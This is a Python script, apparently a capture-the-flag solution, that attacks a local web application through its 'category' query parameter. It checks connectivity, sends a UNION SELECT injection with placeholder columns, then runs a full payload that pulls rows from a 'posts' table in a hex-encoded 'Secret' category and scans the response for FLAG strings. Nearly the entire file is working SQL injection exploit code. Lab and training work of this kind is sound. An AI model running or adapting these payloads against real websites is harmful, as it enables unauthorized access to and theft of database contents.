import urllib.request, urllib.parse
import sys

# First, test basic connectivity
print("=" * 60)
print("STEP 1: Testing basic connectivity")
print("=" * 60)

try:
    resp = urllib.request.urlopen("http://127.0.0.1:33130/", timeout=10)
    content = resp.read().decode('utf-8', errors='ignore')
    print(f"✓ Connected successfully")
    print(f"✓ Status: {resp.status}")
    print(f"✓ Content length: {len(content)} bytes")
    print("\nFirst 500 chars of response:")
    print(content[:500])
except Exception as e:
    print(f"✗ Connection failed: {e}")
    sys.exit(1)

print("\n" + "=" * 60)
print("STEP 2: Testing simple SQL injection")
print("=" * 60)

# Try a simple union with NULLs first
target_url = "http://127.0.0.1:33130/?category="
simple_payload = "NoExist' UNION SELECT 1,2,3,4,5,6,7--"
encoded = urllib.parse.quote(simple_payload, safe='')
full_url = target_url + encoded

print(f"URL: {full_url}")
print(f"Payload: {simple_payload}")

try:
    req = urllib.request.Request(full_url)
    response = urllib.request.urlopen(req, timeout=10)
    content = response.read().decode('utf-8', errors='ignore')
    
    print(f"\n✓ Request succeeded")
    print(f"Status: {response.status}")
    print(f"Content length: {len(content)}")
    print("\nResponse (first 800 chars):")
    print(content[:800])
    
    # Check if we see numeric values from our UNION
    if "1" in content and "2" in content:
        print("\n[✓] UNION injection working - seeing placeholder values!")
    else:
        print("\n[-] UNION may not be working as expected")
        
except Exception as e:
    print(f"\n✗ Request failed: {e}")
    import traceback
    traceback.print_exc()

print("\n" + "=" * 60)
print("STEP 3: Extracting Secret posts")
print("=" * 60)

# Now try the full payload
secret_payload = "NoExist' UNION SELECT id,title,excerpt,content,category,author,created_at FROM posts WHERE category=0x536563726574--"
secret_encoded = urllib.parse.quote(secret_payload, safe='')
secret_url = target_url + secret_encoded

print(f"URL: {secret_url}")
print(f"Payload: {secret_payload}")
print("\nAttempting request...")

try:
    req = urllib.request.Request(secret_url)
    response = urllib.request.urlopen(req, timeout=15)
    content = response.read().decode('utf-8', errors='ignore')
    
    print(f"\n✓ Request succeeded!")
    print(f"Status: {response.status}")
    print(f"Content length: {len(content)}")
    
    # Check for flag
    import re
    flags = re.findall(r'FLAG\{[^}]+\}', content)
    if flags:
        print(f"\n[!] FLAGS FOUND: {flags}")
    
    # Look for Secret category
    if "Secret" in content:
        print(f"\n[✓] Found 'Secret' category content!")
        # Find the sections with Secret
        lines = content.split('\n')
        for i, line in enumerate(lines):
            if 'Secret' in line:
                print(f"\nFound at line {i}:")
                context_start = max(0, i-3)
                context_end = min(len(lines), i+4)
                print('\n'.join(lines[context_start:context_end]))
    else:
        print("\n[-] 'Secret' not found in response")
    
    print("\n" + "=" * 80)
    print("FULL RESPONSE:")
    print("=" * 80)
    print(content)
    print("=" * 80)
    
except Exception as e:
    print(f"\n✗ Request failed: {e}")
    import traceback
    traceback.print_exc()
